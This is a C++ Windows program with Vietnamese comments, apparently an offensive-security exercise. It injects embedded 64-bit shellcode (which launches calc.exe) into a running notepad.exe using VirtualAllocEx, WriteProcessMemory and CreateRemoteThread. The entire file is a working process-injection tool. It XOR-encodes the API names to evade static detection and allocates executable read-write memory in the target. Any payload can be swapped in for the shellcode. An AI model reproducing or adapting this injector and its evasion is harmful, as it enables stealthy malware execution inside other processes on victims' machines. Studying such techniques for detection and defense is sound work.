#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
using namespace std;

// ============================================================================
// SHELLCODE - MỞ CALC.EXE (64-bit)
// ============================================================================

unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

unsigned int shellcodeSize = sizeof(shellcode) - 1;

// ============================================================================
// FUNCTION POINTER TYPEDEFS
// ============================================================================

typedef LPVOID(WINAPI* VAExType)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
    );

typedef BOOL(WINAPI* WPMType)(
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T* lpNumberOfBytesWritten
    );

typedef HANDLE(WINAPI* CRTType)(
    HANDLE hProcess,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId   // ← LPDWORD, không phải DWORD
    );

// ============================================================================
// CẤU TRÚC KẾT QUẢ
// ============================================================================

struct InjectionResult {
    bool success;
    HANDLE hProcess;
    LPVOID remoteMemory;
    HANDLE hThread;
    DWORD threadId;
    DWORD lastError;
    const char* errorMsg;
};

// ============================================================================
// HÀM KHỞI TẠO
// ============================================================================

void InitResult(InjectionResult* result) {
    result->success = false;
    result->hProcess = NULL;
    result->remoteMemory = NULL;
    result->hThread = NULL;
    result->threadId = 0;
    result->lastError = 0;
    result->errorMsg = "Unknown";
}

// ============================================================================
// HÀM KIỂM TRA HANDLE
// ============================================================================

bool IsValidHandle(HANDLE h) {
    return (h != NULL && h != INVALID_HANDLE_VALUE);
}

// ============================================================================
// HÀM DỌN DẸP
// ============================================================================

void Cleanup(InjectionResult* result) {
    if (IsValidHandle(result->hThread)) {
        CloseHandle(result->hThread);
        result->hThread = NULL;
    }

    if (result->remoteMemory != NULL && IsValidHandle(result->hProcess)) {
        VirtualFreeEx(result->hProcess, result->remoteMemory, 0, MEM_RELEASE);
        result->remoteMemory = NULL;
    }

    if (IsValidHandle(result->hProcess)) {
        CloseHandle(result->hProcess);
        result->hProcess = NULL;
    }
}

// ============================================================================
// API OBFUSCATION - XOR
// ============================================================================

void XOR(unsigned char* data, size_t data_len, const char* key, size_t key_len) {
    int j = 0;
    for (size_t i = 0; i < data_len; i++) {
        if (j == key_len) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

// ============================================================================
// HÀM LẤY - GET API ADDRESSES WITH OBFUSCATION
// ============================================================================

bool GetAPIFunctions(
    HMODULE hModule,
    VAExType* pVAEx,
    WPMType* pWPM,
    CRTType* pCRT
) {
    const char* key = "offensivepanda";
    size_t key_len = strlen(key);

    // Mảng tên API đã mã hóa
    unsigned char sVAEx[] = {
        0x39, 0x0f, 0x14, 0x11, 0x1b, 0x12, 0x05, 0x37,
        0x09, 0x1c, 0x0e, 0x0d, 0x21, 0x19
    };

    unsigned char sWPM[] = {
        0x38, 0x14, 0x0f, 0x11, 0x0b, 0x23, 0x1b, 0x19,
        0x06, 0x15, 0x12, 0x1d, 0x29, 0x04, 0x02, 0x09,
        0x14, 0x1c
    };

    unsigned char sCRT[] = {
        0x2c, 0x14, 0x03, 0x04, 0x1a, 0x16, 0x3b, 0x13,
        0x08, 0x1f, 0x15, 0x0b, 0x30, 0x09, 0x1d, 0x03,
        0x07, 0x01
    };

    // Decrypt VirtualAllocEx
    char* vaExName = new char[sizeof(sVAEx) + 1];
    memcpy(vaExName, sVAEx, sizeof(sVAEx));
    XOR((unsigned char*)vaExName, sizeof(sVAEx), key, key_len);
    vaExName[sizeof(sVAEx)] = '\0';

    // Decrypt WriteProcessMemory
    char* wpmName = new char[sizeof(sWPM) + 1];
    memcpy(wpmName, sWPM, sizeof(sWPM));
    XOR((unsigned char*)wpmName, sizeof(sWPM), key, key_len);
    wpmName[sizeof(sWPM)] = '\0';

    // Decrypt CreateRemoteThread
    char* crtName = new char[sizeof(sCRT) + 1];
    memcpy(crtName, sCRT, sizeof(sCRT));
    XOR((unsigned char*)crtName, sizeof(sCRT), key, key_len);
    crtName[sizeof(sCRT)] = '\0';

    // Get function addresses
    *pVAEx = (VAExType)GetProcAddress(hModule, (LPCSTR)vaExName);
    *pWPM = (WPMType)GetProcAddress(hModule, (LPCSTR)wpmName);
    *pCRT = (CRTType)GetProcAddress(hModule, (LPCSTR)crtName);

    // Cleanup
    delete[] vaExName;
    delete[] wpmName;
    delete[] crtName;

    if (*pVAEx == NULL || *pWPM == NULL || *pCRT == NULL) {
        cout << "[!] Failed to get API function addresses" << endl;
        return false;
    }

    cout << "[+] API functions resolved successfully (obfuscated)" << endl;
    return true;
}

// ============================================================================
// HÀM TÌM PROCESS THEO TÊN
// ============================================================================

DWORD FindProcessIdByName(const wstring& processName) {
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        cout << "[!] CreateToolhelp32Snapshot failed. Error: " << GetLastError() << endl;
        return 0;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    wstring targetLower = processName;
    for (auto& c : targetLower) c = towlower(c);

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            wstring currentLower = pe32.szExeFile;
            for (auto& c : currentLower) c = towlower(c);

            if (currentLower == targetLower) {
                processId = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return processId;
}

// ============================================================================
// HÀM LẤY PROCESS HANDLE
// ============================================================================

HANDLE GetProcessHandle(DWORD pid) {
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );

    if (hProcess == NULL) {
        cout << "[!] OpenProcess failed. Error: " << GetLastError() << endl;
        return NULL;
    }

    cout << "[+] Process handle obtained: 0x" << hex << hProcess << dec << endl;
    return hProcess;
}

// ============================================================================
// HÀM LẤY - ALLOCATE MEMORY
// ============================================================================

bool AllocateRemoteMemory(InjectionResult* result, VAExType pVAEx) {
    cout << "[+] Allocating " << shellcodeSize << " bytes in remote process..." << endl;

    result->remoteMemory = pVAEx(
        result->hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (result->remoteMemory == NULL) {
        result->lastError = GetLastError();
        result->errorMsg = "VirtualAllocEx failed";
        cout << "[!] VirtualAllocEx failed. Error: " << result->lastError << endl;
        return false;
    }

    cout << "[+] Memory allocated at: 0x" << hex << result->remoteMemory << dec << endl;
    return true;
}

// ============================================================================
// HÀM LẤY - WRITE SHELLCODE
// ============================================================================

bool WriteShellcodeToRemote(InjectionResult* result, WPMType pWPM) {
    cout << "[+] Writing shellcode to remote process..." << endl;

    SIZE_T bytesWritten = 0;
    BOOL success = pWPM(
        result->hProcess,
        result->remoteMemory,
        shellcode,
        shellcodeSize,
        &bytesWritten
    );

    if (!success || bytesWritten != shellcodeSize) {
        result->lastError = GetLastError();
        result->errorMsg = "WriteProcessMemory failed";
        cout << "[!] WriteProcessMemory failed. Error: " << result->lastError << endl;
        return false;
    }

    cout << "[+] Shellcode written successfully (" << bytesWritten << " bytes)" << endl;
    return true;
}

// ============================================================================
// HÀM LẤY - CREATE REMOTE THREAD (ĐÃ SỬA)
// ============================================================================

bool CreateRemoteThread(InjectionResult* result, CRTType pCRT) {
    cout << "[+] Creating remote thread..." << endl;

    result->hThread = pCRT(
        result->hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)result->remoteMemory,
        NULL,
        0,
        &result->threadId   // ← THÊM DẤU & VÀO ĐÂY
    );

    if (!IsValidHandle(result->hThread)) {
        result->lastError = GetLastError();
        result->errorMsg = "CreateRemoteThread failed";
        cout << "[!] CreateRemoteThread failed. Error: " << result->lastError << endl;
        return false;
    }

    cout << "[+] Remote thread created. Thread ID: " << result->threadId << endl;
    return true;
}

// ============================================================================
// HÀM THỰC THI INJECTION
// ============================================================================

bool ExecuteInjection(InjectionResult* result, const wstring& targetProcess) {
    cout << "\n[+] === STARTING REMOTE CODE INJECTION (OBFUSCATED) ===" << endl;
    cout << "[+] Target process: ";
    wcout << targetProcess << endl;

    // Bước 1: Tìm PID
    cout << "\n[+] Step 1: Finding target process..." << endl;
    DWORD pid = FindProcessIdByName(targetProcess);

    if (pid == 0) {
        result->errorMsg = "Target process not found";
        cout << "[!] Target process not found: ";
        wcout << targetProcess << endl;
        cout << "[!] Please start the target process first." << endl;
        return false;
    }

    cout << "[+] Process found. PID: " << pid << endl;

    // Bước 2: Lấy process handle
    cout << "\n[+] Step 2: Getting process handle..." << endl;
    result->hProcess = GetProcessHandle(pid);

    if (!IsValidHandle(result->hProcess)) {
        result->errorMsg = "Failed to get process handle";
        return false;
    }

    // Bước 3: Load kernel32.dll
    cout << "\n[+] Step 3: Loading kernel32.dll..." << endl;
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");

    if (hKernel32 == NULL) {
        result->errorMsg = "Failed to load kernel32.dll";
        cout << "[!] Failed to load kernel32.dll" << endl;
        Cleanup(result);
        return false;
    }

    cout << "[+] kernel32.dll loaded at: 0x" << hex << hKernel32 << dec << endl;

    // Bước 4: Get API functions (obfuscated)
    cout << "\n[+] Step 4: Resolving API functions (obfuscated)..." << endl;
    VAExType pVAEx = NULL;
    WPMType pWPM = NULL;
    CRTType pCRT = NULL;

    if (!GetAPIFunctions(hKernel32, &pVAEx, &pWPM, &pCRT)) {
        result->errorMsg = "Failed to resolve API functions";
        Cleanup(result);
        return false;
    }

    // Bước 5: Allocate memory
    cout << "\n[+] Step 5: Allocating memory..." << endl;
    if (!AllocateRemoteMemory(result, pVAEx)) {
        Cleanup(result);
        return false;
    }

    // Bước 6: Write shellcode
    cout << "\n[+] Step 6: Writing shellcode..." << endl;
    if (!WriteShellcodeToRemote(result, pWPM)) {
        Cleanup(result);
        return false;
    }

    // Bước 7: Create remote thread
    cout << "\n[+] Step 7: Creating remote thread..." << endl;
    if (!CreateRemoteThread(result, pCRT)) {
        Cleanup(result);
        return false;
    }

    // Bước 8: Wait for thread
    cout << "\n[+] Step 8: Waiting for thread (1s)..." << endl;
    Sleep(1000);

    // Bước 9: Cleanup
    cout << "\n[+] Step 9: Cleanup..." << endl;

    if (IsValidHandle(result->hThread)) {
        CloseHandle(result->hThread);
        result->hThread = NULL;
        cout << "[+] Remote thread handle closed." << endl;
    }

    if (IsValidHandle(result->hProcess)) {
        CloseHandle(result->hProcess);
        result->hProcess = NULL;
        cout << "[+] Process handle closed." << endl;
    }

    result->success = true;
    result->errorMsg = "Success";
    cout << "\n[+] === INJECTION SUCCESSFUL ===" << endl;

    return true;
}

// ============================================================================
// HÀM IN BANNER
// ============================================================================

void PrintBanner() {
    cout << "============================================================" << endl;
    cout << "  CLASSIC CODE INJECTION - API OBFUSCATION" << endl;
    cout << "============================================================" << endl;
    cout << "[+] Technique: Remote Thread Injection" << endl;
    cout << "[+] Shellcode: calc.exe (" << shellcodeSize << " bytes)" << endl;
    cout << "[+] API Obfuscation: XOR encrypted API names" << endl;
    cout << "============================================================" << endl;
}

// ============================================================================
// HÀM IN KẾT QUẢ
// ============================================================================

void PrintResult(const InjectionResult* result) {
    cout << "\n============================================================" << endl;
    if (result->success) {
        cout << "  [SUCCESS] Shellcode injected and executed!" << endl;
        cout << "  [+] Check if Calculator opened in target process." << endl;
        cout << "  [+] API names were obfuscated during execution." << endl;
    }
    else {
        cout << "  [FAILED] Shellcode injection failed!" << endl;
        cout << "  [+] Error: " << result->errorMsg << endl;
        if (result->lastError != 0) {
            cout << "  [+] Code: 0x" << hex << result->lastError << dec << endl;
        }
    }
    cout << "============================================================" << endl;
}

// ============================================================================
// MAIN
// ============================================================================

int main() {
    PrintBanner();

    wstring targetProcess = L"notepad.exe";

    InjectionResult result;
    InitResult(&result);

    if (ExecuteInjection(&result, targetProcess)) {
        PrintResult(&result);
    }
    else {
        PrintResult(&result);
    }

    cout << "\nPress Enter to exit..." << endl;
    cin.get();

    return result.success ? 0 : 1;
}